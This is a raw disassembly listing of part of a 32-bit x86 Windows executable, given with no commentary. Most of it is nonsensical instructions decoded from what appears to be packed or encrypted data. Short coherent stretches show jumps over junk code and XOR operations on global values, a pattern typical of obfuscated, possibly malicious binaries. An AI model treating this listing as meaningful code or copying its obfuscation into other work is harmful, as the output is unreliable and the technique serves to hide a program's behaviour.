  40d998:	out    dx,al
  40d999:	push   ds
  40d99a:	ret    
  40d99b:	jb     0x40d9ce
  40d99d:	stos   BYTE PTR es:[edi],al
  40d99e:	js     0x40d960
  40d9a0:	int3   
  40d9a1:	add    BYTE PTR es:[ebp+0xde9e216],bl
  40d9a8:	dec    DWORD PTR [ebx+0x3]
  40d9ab:	stc    
  40d9ac:	js     0x40d967
  40d9ae:	jmp    0xd16f720c
  40d9b3:	cs and al,bh
  40d9b6:	xor    ebx,DWORD PTR [edx]
  40d9b8:	cmp    eax,0x9e3bf179
  40d9bd:	stos   BYTE PTR es:[edi],al
  40d9be:	adc    al,0xc4
  40d9c0:	mov    edi,eax
  40d9c2:	push   cs
  40d9c3:	(bad)  
  40d9c4:	loop   0x40d974
  40d9c6:	sahf   
  40d9c7:	es jb  0x40da23
  40d9ca:	mov    eax,0xef53388b
  40d9cf:	add    bl,bh
  40d9d1:	or     eax,0x2c0c9f7c
  40d9d6:	xchg   DWORD PTR [ebp+0x5f],edi
  40d9d9:	sbb    DWORD PTR [ebp+0x2b],eax
  40d9dc:	jmp    0x2abf6949
  40d9e1:	in     al,0xec
  40d9e3:	jb     0x40d9b2
  40d9e5:	pop    eax
  40d9e6:	es pop ds
  40d9e8:	xchg   esi,eax
  40d9e9:	imul   edi,ebp,0x2a121a96
  40d9ef:	(bad)  [edx]
  40d9f1:	xor    DWORD PTR [edi],esi
  40d9f3:	jae    0x40da6b
  40d9f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9f6:	lock pop ecx
  40d9f8:	inc    edx
  40d9f9:	loopne 0x40da5f
  40d9fb:	imul   ecx,DWORD PTR [ebx-0x279e1345],0xb6dfa4fd
  40da05:	sub    esi,ecx
  40da07:	mov    esp,0x1e3987df
  40da0c:	add    ebp,DWORD PTR [eax]
  40da0e:	jl     0x40d9bf
  40da10:	mov    ?,WORD PTR [eax-0x39]
  40da13:	lea    edx,[ecx+edi*2+0x5aa72150]
  40da1a:	clc    
  40da1b:	cwde   
  40da1c:	imul   esi,DWORD PTR [eax+ebx*8],0x34
  40da20:	popf   
  40da21:	mov    edx,DWORD PTR ds:0x8c404c03
  40da27:	sub    BYTE PTR ds:[edx+0x25],al
  40da2b:	adc    al,0xd
  40da2d:	repz data16 stc 
  40da30:	fnstsw WORD PTR [esi-0x2f]
  40da33:	mov    ch,0x4
  40da35:	pop    es
  40da36:	pop    ss
  40da37:	inc    eax
  40da38:	or     DWORD PTR [edi],esi
  40da3a:	pop    es
  40da3b:	jne    0x40d9f9
  40da3d:	pushf  
  40da3e:	stos   DWORD PTR es:[edi],eax
  40da3f:	dec    esi
  40da40:	dec    ecx
  40da41:	xor    ch,BYTE PTR [eax+0x3d]
  40da44:	dec    ebx
  40da45:	into   
  40da46:	shld   DWORD PTR [ecx+0xde66c49],ecx,cl
  40da4d:	(bad)  
  40da4e:	ja     0x40da97
  40da50:	xor    eax,DWORD PTR [ebx+0x0]
  40da53:	jnp    0x40da5c
  40da55:	xor    BYTE PTR [eax+0xb569023],bh
  40da5b:	mov    dh,0x36
  40da5d:	pop    es
  40da5e:	jne    0x40da75
  40da60:	leave  
  40da61:	aad    0xa6
  40da63:	adc    BYTE PTR [ebx+0x5f2ebdaa],bl
  40da69:	shr    BYTE PTR [esi],0xca
  40da6c:	inc    esi
  40da6d:	and    eax,0x13a1a9f0
  40da72:	xor    ecx,DWORD PTR [esi-0x8]
  40da75:	aaa    
  40da76:	div    DWORD PTR [ebx-0x434f3c32]
  40da7c:	les    ebp,FWORD PTR [edx+0x52]
  40da7f:	push   ds
  40da80:	pop    ecx
  40da81:	and    DWORD PTR [esp+edi*4],eax
  40da84:	jno    0x40da29
  40da86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da87:	cmp    DWORD PTR [ebx+0x53],ecx
  40da8a:	jle    0x40dad0
  40da8c:	jg     0x40da24
  40da8e:	hlt    
  40da8f:	or     BYTE PTR [edi+0x69],bh
  40da92:	pop    ecx
  40da93:	add    DWORD PTR [edi+eax*4],edi
  40da96:	jl     0x40dad5
  40da98:	xchg   DWORD PTR [esi+ecx*2+0x6b5fdbf8],edi
  40da9f:	lds    ebx,FWORD PTR [ebx]
  40daa1:	jecxz  0x40dae9
  40daa3:	xchg   ebx,eax
  40daa4:	enter  0x2b17,0x41
  40daa8:	add    DWORD PTR [edx+eax*2-0x7b4f795b],0xfc616683
  40dab3:	dec    ecx
  40dab4:	mov    ebp,0x325b88ca
  40dab9:	leave  
  40daba:	cmp    eax,DWORD PTR [edi]
  40dabc:	mov    bl,BYTE PTR [edi+0x10b31beb]
  40dac2:	fidivr DWORD PTR [ebx-0x23]
  40dac5:	push   ds
  40dac6:	sub    esp,ebx
  40dac8:	and    DWORD PTR [edi+edi*4-0xf],ebp
  40dacc:	mov    ch,0xf7
  40dace:	into   
  40dacf:	or     ch,ah
  40dad1:	aad    0x46
  40dad3:	sbb    eax,0xdb8937b7
  40dad8:	inc    eax
  40dad9:	or     eax,0xbc06319f
  40dade:	jp     0x40daac
  40dae0:	loope  0x40dae4
  40dae2:	cmp    eax,0xf02ec528
  40dae7:	cli    
  40dae8:	out    0xc7,eax
  40daea:	push   es
  40daeb:	cdq    
  40daec:	add    DWORD PTR [esp+ecx*4+0x5a],edi
  40daf0:	mov    ch,0xef
  40daf2:	pop    esi
  40daf3:	mov    cl,0x43
  40daf5:	je     0x40da8e
  40daf7:	jmp    0x7ff628e5
  40dafc:	mov    edx,0x1bb931a5
  40db01:	lahf   
  40db02:	shl    DWORD PTR [ecx+edi*4],0xec
  40db06:	and    DWORD PTR [ebp-0x33],ecx
  40db09:	and    edi,eax
  40db0b:	sar    DWORD PTR [ebx+0x40],1
  40db0e:	paddusw mm7,QWORD PTR [esp+eiz*4]
  40db12:	ret    0x3072
  40db15:	mov    ecx,0xdc42648e
  40db1a:	jle    0x40db32
  40db1c:	mov    ebp,0xf7bb530
  40db21:	jbe    0x40dade
  40db23:	mov    eax,0x636b08e6
  40db28:	cli    
  40db29:	mov    eax,ds:0x75471481
  40db2e:	(bad)  
  40db2f:	pop    esp
  40db30:	sbb    cl,cl
  40db32:	in     eax,0x50
  40db34:	jns    0x40db07
  40db36:	cmp    DWORD PTR [eax-0x491a7b0e],ebp
  40db3c:	call   0x4db837af
  40db41:	or     bh,dl
  40db43:	cdq    
  40db44:	imul   DWORD PTR [edi]
  40db46:	adc    ah,0x4e
  40db49:	fisubr DWORD PTR [edx-0x62]
  40db4c:	aaa    
  40db4d:	out    dx,eax
  40db4e:	rcr    DWORD PTR [esi+0x3fbe881c],1
  40db54:	ficom  DWORD PTR [eax+0x6a]
  40db57:	adc    al,0x80
  40db59:	push   cs
  40db5a:	test   al,0x40
  40db5c:	imul   edx,DWORD PTR [eax+0x51c876e9],0x7ec5f078
  40db66:	or     BYTE PTR [ebx+eax*1-0x6e],dh
  40db6a:	jp     0x40dbd2
  40db6c:	xor    dl,BYTE PTR [edi-0x3b]
  40db6f:	out    dx,eax
  40db70:	and    al,0x1a
  40db72:	popf   
  40db73:	mov    edx,0xa5630b3d
  40db78:	scas   eax,DWORD PTR es:[edi]
  40db79:	lea    ecx,[edi-0x11]
  40db7c:	mov    ss,WORD PTR [edx+0x12e30b63]
  40db82:	dec    eax
  40db83:	stos   DWORD PTR es:[edi],eax
  40db84:	xchg   BYTE PTR [ebx+0x4],dl
  40db87:	cmp    al,0xd8
  40db89:	jno    0x40dbe6
  40db8b:	ja     0x40db72
  40db8d:	dec    eax
  40db8e:	fwait
  40db8f:	and    ebp,0x5bbadec0
  40db95:	mov    esp,0xb20344f7
  40db9a:	xor    al,0x18
  40db9c:	sbb    BYTE PTR [esi+ecx*1-0x6f2c1c4a],ch
  40dba3:	xlat   BYTE PTR ds:[ebx]
  40dba4:	fwait
  40dba5:	in     eax,0x7d
  40dba7:	push   eax
  40dba8:	arpl   WORD PTR [ebx+0x59f3bb34],bx
  40dbae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbaf:	pop    eax
  40dbb0:	scas   al,BYTE PTR es:[edi]
  40dbb1:	pop    DWORD PTR [edx-0x3ec43ae6]
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi+0x3840145c],0xfa84999c
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dbd4
  40dbe0:	leave  
  40dbe1:	adc    BYTE PTR [ecx+0x60de3a9],dl
  40dbe7:	mov    cl,0xbc
  40dbe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbea:	mov    dl,0x17
  40dbec:	mov    dl,0x1b
  40dbee:	xchg   BYTE PTR [ebx-0x1c],cl
  40dbf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbf2:	jl     0x40db83
  40dbf4:	pop    eax
  40dbf5:	pushf  
  40dbf6:	call   0x3126d6de
  40dbfb:	xchg   esp,eax
  40dbfc:	test   al,0x2d
  40dbfe:	lods   eax,DWORD PTR ds:[esi]
  40dbff:	mov    DWORD PTR fs:[ebp+0x2470ff04],esp
  40dc06:	mov    ds:0x9559d873,eax
  40dc0b:	mov    ah,0xb2
  40dc0d:	xchg   ebx,ecx
  40dc0f:	or     eax,DWORD PTR [edx+0x25]
  40dc12:	push   ds
  40dc13:	jl     0x40dbca
  40dc15:	out    0x32,eax
  40dc17:	or     DWORD PTR [eax+eax*2+0x1f6fe737],edx
  40dc1e:	mov    ebp,0xda42c723
  40dc23:	lods   eax,DWORD PTR ds:[esi]
  40dc24:	popf   
  40dc25:	mov    BYTE PTR [ecx-0x45],dl
  40dc28:	and    al,0xa8
  40dc2a:	adc    BYTE PTR [ebx-0x2b],cl
  40dc2d:	ficomp DWORD PTR [ebx-0x5bc99a5c]
  40dc33:	pop    esp
  40dc34:	(bad)  
  40dc35:	mov    edi,0x218d41d6
  40dc3a:	xchg   DWORD PTR [ebx],esi
  40dc3c:	lods   eax,DWORD PTR ds:[esi]
  40dc3d:	rcl    dh,cl
  40dc3f:	push   ebx
  40dc40:	ins    BYTE PTR es:[edi],dx
  40dc41:	jns    0x40dc28
  40dc43:	mov    cl,BYTE PTR [esi+0x36]
  40dc46:	repnz and al,0x42
  40dc49:	mov    edx,esi
  40dc4b:	imul   ebx,DWORD PTR [edx-0x46780a07],0x7a
  40dc52:	cmp    ch,al
  40dc54:	mov    ah,0xf6
  40dc56:	jl     0x40dc79
  40dc58:	adc    BYTE PTR [eax+0x3f],dh
  40dc5b:	imul   esp,DWORD PTR ds:0x1fe5d8b6,0x15
  40dc62:	inc    edi
  40dc63:	clc    
  40dc64:	sub    al,BYTE PTR [esp+eiz*2+0x59]
  40dc68:	(bad)  
  40dc69:	mov    al,ds:0x96bf95f3
  40dc6e:	sbb    dh,BYTE PTR [ebp+esi*8-0x42a9d07c]
  40dc75:	mov    esp,0x1e731fc4
  40dc7a:	jnp    0x40dc09
  40dc7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc7d:	adc    cl,BYTE PTR [ecx+edi*4+0x40]
  40dc81:	unpckhps xmm7,XMMWORD PTR [edi+0x2f]
  40dc85:	pushf  
  40dc86:	pop    es
  40dc87:	(bad)  
  40dc88:	sub    ah,ah
  40dc8a:	jmp    0xe67e48c8
  40dc8f:	(bad)  
  40dc90:	cmp    DWORD PTR [edi],ebp
  40dc92:	out    0xf1,al
  40dc94:	mov    al,0x9c
  40dc96:	fucomi st,st(0)
  40dc98:	rol    BYTE PTR [esi+edx*4-0x30b11bc3],cl
  40dc9f:	pop    ebx
  40dca0:	sbb    DWORD PTR [ebp+0x4f67face],0x63bc49b3
  40dcaa:	out    0xce,eax
  40dcac:	int3   
  40dcad:	stos   BYTE PTR es:[edi],al
  40dcae:	std    
  40dcaf:	loop   0x40dcfd
  40dcb1:	xchg   BYTE PTR [edi+0x3f4ce65e],bl
  40dcb7:	push   0xffffffa4
  40dcb9:	jae    0x40dc9c
  40dcbb:	shl    BYTE PTR [edi-0x1],1
  40dcbe:	ss push es
  40dcc0:	sbb    eax,0x90a78b6c
  40dcc5:	fs into 
  40dcc7:	and    DWORD PTR [ebx+0x2d],esi
  40dcca:	dec    ebx
  40dccb:	mov    ebp,0xa770c150
  40dcd0:	push   ds
  40dcd1:	xor    dh,BYTE PTR ds:0x9ee8cfb
  40dcd7:	mov    eax,0xe9db757b
  40dcdc:	mov    esp,0xc95fc3a0
  40dce1:	sub    al,0xfb
  40dce3:	mov    cl,0xfb
  40dce5:	jb     0x40dccc
  40dce7:	in     eax,0x94
  40dce9:	and    ecx,DWORD PTR ds:0xcd7b889d
  40dcef:	cs mov cl,0x36
  40dcf2:	and    esi,esi
  40dcf4:	(bad)  
  40dcf5:	ffree  st(6)
  40dcf7:	ret    
  40dcf8:	mov    ds:0xd15cd750,al
  40dcfd:	push   ebx
  40dcfe:	inc    ecx
  40dcff:	test   al,0xef
  40dd01:	lock sub ah,cl
  40dd04:	xchg   edi,eax
  40dd05:	test   BYTE PTR [edi],ah
  40dd07:	pop    esp
  40dd08:	ins    DWORD PTR es:[edi],dx
  40dd09:	adc    dh,BYTE PTR [ebp-0x7]
  40dd0c:	retf   0xbdfc
  40dd0f:	jecxz  0x40dcb7
  40dd11:	push   edx
  40dd12:	cmp    ah,BYTE PTR [ebx]
  40dd14:	les    ebx,FWORD PTR [edi+0x56]
  40dd17:	sub    al,0x11
  40dd19:	imul   eax,DWORD PTR [eax+0x4f7ea512],0x73fd78b1
  40dd23:	or     dl,BYTE PTR [edi+0x54]
  40dd26:	xchg   BYTE PTR [edx-0x61c7e08b],al
  40dd2c:	pop    ebx
  40dd2d:	jne    0x40dd68
  40dd2f:	pop    es
  40dd30:	xlat   BYTE PTR ds:[ebx]
  40dd31:	(bad)
  40dd35:	jb     0x40dda4
  40dd37:	cmp    esi,DWORD PTR [ebp+0x34199275]
  40dd3d:	ins    BYTE PTR es:[edi],dx
  40dd3e:	mov    ah,BYTE PTR [esi]
  40dd40:	pop    eax
  40dd41:	scas   eax,DWORD PTR es:[edi]
  40dd42:	(bad)  [ebp-0x30]
  40dd45:	in     eax,dx
  40dd46:	icebp  
  40dd47:	sub    ecx,DWORD PTR [ebp+0x7b7992d1]
  40dd4d:	std    
  40dd4e:	sub    esp,edx
  40dd50:	push   0x12
  40dd52:	sbb    ebp,DWORD PTR [esi+0x26]
  40dd55:	dec    esp
  40dd56:	addr16 sub eax,0x996ae92b
  40dd5c:	not    BYTE PTR [eax-0x61]
  40dd5f:	xor    al,0xf6
  40dd61:	ds push edx
  40dd63:	jge    0x40dd2c
  40dd65:	hlt    
  40dd66:	in     al,dx
  40dd67:	popa   
  40dd68:	inc    eax
  40dd69:	push   edi
  40dd6a:	xor    BYTE PTR [esi-0x3786280c],ah
  40dd70:	das    
  40dd71:	mov    eax,ds:0x612cce11
  40dd76:	ret    0xef66
  40dd79:	in     eax,dx
  40dd7a:	cli    
  40dd7b:	scas   al,BYTE PTR es:[edi]
  40dd7c:	icebp  
  40dd7d:	cli    
  40dd7e:	jo     0x40ddeb
  40dd80:	mov    ds:0x620384a1,al
  40dd85:	and    DWORD PTR [eax-0x29d31c73],ebp
  40dd8b:	loop   0x40dd59
  40dd8d:	mov    ch,0x28
  40dd8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd90:	pop    esi
  40dd91:	mov    WORD PTR [eax+0x207157e2],?
  40dd97:	std    
  40dd98:	cmp    eax,0xbf96b920
  40dd9d:	test   eax,0xcc2e1d32
  40dda2:	inc    esp
  40dda3:	fild   DWORD PTR [edi+ebp*1]
  40dda6:	aad    0x71
  40dda8:	push   eax
  40dda9:	push   esi
  40ddaa:	cmp    eax,0x9cec597d
  40ddaf:	in     al,dx
  40ddb0:	mov    DWORD PTR [edx-0x10a5c37b],ebx
  40ddb6:	adc    al,0x57
  40ddb8:	cmp    BYTE PTR [eax],bh
  40ddba:	push   ecx
  40ddbb:	adc    DWORD PTR [eax+0x9d4d035],ebp
  40ddc1:	sbb    eax,DWORD PTR cs:[ebp-0x1425f1dc]
  40ddc8:	sub    BYTE PTR [edi],dh
  40ddca:	loopne 0x40ddc5
  40ddcc:	jae    0x40dded
  40ddce:	mov    DWORD PTR [esi],ebp
  40ddd0:	mov    eax,0x633f258a
  40ddd5:	int    0x96
  40ddd7:	push   eax
  40ddd8:	loop   0x40dd9b
  40ddda:	in     eax,dx
  40dddb:	cmp    cl,BYTE PTR [ebx-0x62]
  40ddde:	popf   
  40dddf:	imul   esi
  40dde1:	mov    dh,0x6c
  40dde3:	adc    DWORD PTR [edx],eax
  40dde5:	cmp    eax,0x678707f
  40ddea:	xchg   edx,eax
  40ddeb:	in     al,dx
  40ddec:	pop    es
  40dded:	pop    ss
  40ddee:	jb     0x40ddaa
  40ddf0:	push   0x481b7bac
  40ddf5:	or     esi,DWORD PTR ss:[ebx+0x4e451624]
  40ddfc:	stos   BYTE PTR es:[edi],al
  40ddfd:	add    eax,0xd369974a
  40de02:	mov    ah,0x75
  40de04:	mov    ecx,0x3eaf2c22
  40de09:	div    edx
  40de0b:	cmp    DWORD PTR [esi+0x72],ebx
  40de0e:	pop    ecx
  40de0f:	mov    ebp,0x9694aaeb
  40de14:	ins    BYTE PTR es:[edi],dx
  40de15:	jg     0x40dde6
  40de17:	mov    WORD PTR [edi+0x18cda981],ss
  40de1d:	xor    ebp,DWORD PTR [edi+0x3]
  40de20:	(bad)  
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43369f,0x0
  40de5a:	mov    eax,ds:0x43369f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43369f,eax
  40de65:	cmp    DWORD PTR ds:0x43369f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43369f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4336ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	test   esp,0xba46db0d
  40deab:	pushf  
  40deac:	jle    0x40df2c
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40ded5
  40deb3:	sub    dh,BYTE PTR [edi+0x440996f3]
  40deb9:	or     al,0x61
  40debb:	inc    esp
  40debc:	aam    0x9a
  40debe:	adc    eax,0x5cb19105
  40dec3:	cmp    ecx,DWORD PTR [ebx-0x53e926c7]
  40dec9:	neg    DWORD PTR [ecx]
  40decb:	xor    DWORD PTR [edi-0x21],0xe9ffe140
  40ded2:	test   al,0x4f
  40ded4:	ds jl  0x40de85
  40ded7:	sti    
  40ded8:	out    dx,al
  40ded9:	add    eax,0xce3f7aa0
  40dede:	cmp    DWORD PTR [ebx],eax
  40dee0:	sbb    ch,dl
  40dee2:	bound  ebp,QWORD PTR [ebx]
  40dee4:	jle    0x40de89
  40dee6:	idiv   BYTE PTR [ebx-0x6b]
  40dee9:	adc    eax,0x9c7e1e33
  40deee:	cwde   
  40deef:	mov    ah,0x5
  40def1:	sub    bl,BYTE PTR [eax]
  40def3:	retf   0xb4e6
  40def6:	xor    BYTE PTR [eax+0x49],cl
  40def9:	mov    cl,BYTE PTR [esi+0x587ed03e]
  40deff:	lock fs and al,0x9a
  40df03:	xchg   BYTE PTR [ebx+0x2a],dl
  40df06:	mov    al,ds:0x1b9ec8af
  40df0b:	cmp    al,0x41
  40df0d:	jo     0x40df08
  40df0f:	mov    bh,0x67
  40df11:	mul    bl
  40df13:	pop    esi
  40df14:	cld    
  40df15:	sbb    eax,0xd6eb10d2
  40df1a:	arpl   WORD PTR [esi+0x5bb99b0b],di
  40df20:	sub    DWORD PTR [edx-0x39cda81d],0x8b83b22b
  40df2a:	addr16 fwait
  40df2c:	and    bh,ah
  40df2e:	add    DWORD PTR [ebx+eiz*2-0x3c],edx
  40df32:	pop    esi
  40df33:	xor    bl,BYTE PTR [edx-0x5e]
  40df36:	jnp    0x40df9a
  40df38:	stos   DWORD PTR es:[edi],eax
  40df39:	inc    edi
  40df3a:	fwait
  40df3b:	cmc    
  40df3c:	xchg   ebx,eax
  40df3d:	adc    eax,0xaf14be1a
  40df42:	jnp    0x40ded8
  40df44:	cmc    
  40df45:	stos   BYTE PTR es:[edi],al
  40df46:	cld    
  40df47:	dec    ebp
  40df48:	jmp    0x40df6d
  40df4a:	int3   
  40df4b:	sbb    edi,ecx
  40df4d:	or     al,0x18
  40df4f:	repz fisttp QWORD PTR ds:[ebx-0x211041a0]
  40df57:	es out dx,al
  40df59:	xchg   DWORD PTR fs:[edx-0x39],edi
  40df5d:	jge    0x40df25
  40df5f:	mov    ecx,0xb08edbec
  40df64:	xor    al,bh
  40df66:	cwde   
  40df67:	addr16 out 0x80,al
  40df6a:	xchg   BYTE PTR [edx+edi*1],bh
  40df6d:	dec    esi
  40df6e:	mov    ch,0xe0
  40df70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df71:	mov    DWORD PTR [eax],edi
  40df73:	aas    
  40df74:	xchg   esp,eax
  40df75:	inc    edi
  40df76:	sub    DWORD PTR [ebx+0x72],esp
  40df79:	push   ecx
  40df7a:	push   0x16
  40df7c:	ins    DWORD PTR es:[edi],dx
  40df7d:	retf   0xf03c
  40df80:	xchg   edi,eax
  40df81:	xchg   ecx,eax
  40df82:	and    dh,bl
  40df84:	xor    DWORD PTR [ebx-0x2e6a867e],edi
  40df8a:	jns    0x40dfb3
  40df8c:	dec    edx
  40df8d:	cmp    BYTE PTR [edi+0x4e],cl
  40df90:	pop    esi
  40df91:	jno    0x40dfc8
  40df93:	clc    
  40df94:	mov    ecx,0x36eaff17
  40df99:	lds    ebx,FWORD PTR [edx]
  40df9b:	ret    0xe153
  40df9e:	mov    ah,0x6f
  40dfa0:	dec    esi
  40dfa1:	leave  
  40dfa2:	mov    edi,0x99b7bd33
  40dfa7:	fsub   DWORD PTR [ecx+edi*2+0x7b4a7659]
  40dfae:	dec    ebp
  40dfaf:	add    bh,ah
  40dfb1:	daa    
  40dfb2:	dec    esp
  40dfb3:	dec    edi
  40dfb4:	mov    DWORD PTR [ebp-0xfd894ab],edi
  40dfba:	push   edi
  40dfbb:	das    
  40dfbc:	inc    esp
  40dfbd:	mov    eax,0xa1664f6d
  40dfc2:	xor    eax,DWORD PTR [ecx+ebp*1]
  40dfc5:	stos   BYTE PTR es:[edi],al
  40dfc6:	out    0x96,eax
  40dfc8:	imul   edx,DWORD PTR [ebx+0x57],0xffffff8b
  40dfcc:	xchg   ecx,ebp
  40dfce:	mov    eax,DWORD PTR [ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433697,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x4336eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	or     edx,edi
  40e005:	popaw  
  40e007:	pop    esi
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e057
  40e010:	inc    ebp
  40e011:	and    al,0x8f
  40e013:	push   ds
  40e014:	jmp    DWORD PTR ds:0xc57620c9
  40e01a:	jbe    0x40e095
  40e01c:	loope  0x40dfda
  40e01e:	ja     0x40dff1
  40e020:	pop    edx
  40e021:	scas   al,BYTE PTR es:[edi]
  40e022:	sub    al,bh
  40e024:	xlat   BYTE PTR ds:[ebx]
  40e025:	jp     0x629c4856
  40e02b:	in     eax,dx
  40e02c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e02d:	lea    edi,[esi]
  40e02f:	mov    ds:0x30fef318,al
  40e034:	cs lahf 
  40e036:	leave  
  40e037:	mov    ah,0x35
  40e039:	jmp    0x4330:0xcf22fcbd
  40e040:	fwait
  40e041:	ret    
  40e042:	and    ah,BYTE PTR [eax]
  40e044:	mov    ecx,0x24600ae4
  40e049:	mov    ebp,ebp
  40e04b:	retf   
  40e04c:	adc    al,0x95
  40e04e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e04f:	pop    ebx
  40e050:	stos   DWORD PTR es:[edi],eax
  40e051:	test   DWORD PTR [eax+0xda47fe8],ecx
  40e057:	cdq    
  40e058:	nop
  40e059:	mov    al,ds:0x4c468772
  40e05e:	jbe    0x40e017
  40e060:	cmp    eax,0x19b5db57
  40e065:	pop    ebx
  40e066:	inc    ebp
  40e067:	inc    esp
  40e068:	nop
  40e069:	aad    0xed
  40e06b:	or     eax,0xa8fea480
  40e070:	ret    
  40e071:	stc    
  40e072:	add    al,0x94
  40e074:	ins    BYTE PTR es:[edi],dx
  40e075:	jnp    0x40e022
  40e077:	shr    ebx,1
  40e079:	jb     0x40e0bd
  40e07b:	and    ebp,0xe4b41275
  40e081:	mov    ebx,0x2bfa1c1
  40e086:	jo     0x40e016
  40e088:	xor    edx,0x33
  40e08b:	add    BYTE PTR [ebp-0x48],ch
  40e08e:	popa   
  40e08f:	sub    ecx,DWORD PTR [edx]
  40e091:	jg     0x40e0ce
  40e093:	pop    ecx
  40e094:	into   
  40e095:	inc    edx
  40e096:	scas   al,BYTE PTR es:[edi]
  40e097:	mov    edi,0xcbaff38b
  40e09c:	out    0x4c,al
  40e09e:	iret   
  40e09f:	xchg   esp,eax
  40e0a0:	cmc    
  40e0a1:	inc    edi
  40e0a2:	ret    0xc762
  40e0a5:	mov    edi,0x7f53ab2b
  40e0aa:	add    eax,0xd38e2a64
  40e0af:	pushw  es
  40e0b1:	dec    ebx
  40e0b2:	dec    edi
  40e0b3:	sub    BYTE PTR ss:[ecx+0x77],dh
  40e0b7:	(bad)  
  40e0b8:	pop    eax
  40e0b9:	sub    al,0x6e
  40e0bb:	sahf   
  40e0bc:	(bad)  
  40e0bd:	xchg   esp,eax
  40e0be:	hlt    
  40e0bf:	mov    edi,0x2b0e08cc
  40e0c4:	sbb    ecx,eax
  40e0c6:	jnp    0x40e122
  40e0c8:	adc    edi,ecx
  40e0ca:	imul   ah
  40e0cc:	test   BYTE PTR [edi+0xd],0xca
  40e0d0:	les    eax,FWORD PTR [ebp+0x783feca5]
  40e0d6:	mov    dl,0x27
  40e0d8:	jns    0x40e065
  40e0da:	lds    edi,FWORD PTR [esi-0x55490cb6]
  40e0e0:	pushf  
  40e0e1:	push   esi
  40e0e2:	shr    DWORD PTR [edx+0x63],cl
  40e0e5:	repnz xor edx,DWORD PTR [eax+ebx*1-0x48]
  40e0ea:	loop   0x40e0e3
  40e0ec:	pop    ss
  40e0ed:	les    edx,FWORD PTR [ebx-0x1a]
  40e0f0:	bound  edx,QWORD PTR [edi+0x4075d78d]
  40e0f6:	div    BYTE PTR [edi+0x3]
  40e0f9:	push   cs
  40e0fa:	sbb    BYTE PTR [ecx+0x1b],bl
  40e0fd:	pop    esp
  40e0fe:	imul   edi,ebp,0xffffff97
  40e101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e102:	jmp    0x6bff:0x6ff75c6b
  40e109:	adc    ecx,DWORD PTR [eax]
  40e10b:	jl     0x40e110
  40e10d:	xchg   edi,eax
  40e10e:	mov    eax,esi
  40e110:	daa    
  40e111:	jle    0x40e113
  40e113:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e115:	cmc    
  40e116:	add    ecx,DWORD PTR [ebx-0x7cf48ab6]
  40e11c:	pop    esp
  40e11d:	sbb    al,0xef
  40e11f:	push   0x322132db
  40e124:	stos   BYTE PTR es:[edi],al
  40e125:	dec    edi
  40e126:	push   ds
  40e127:	cwde   
  40e128:	fidiv  DWORD PTR [eax-0x60]
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x4336a3,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x4336ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	add    ebp,edx
  40e15c:	int    0x37
  40e15e:	jb     0x40e0fa
  40e160:	jle    0x40e1e0
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e1af
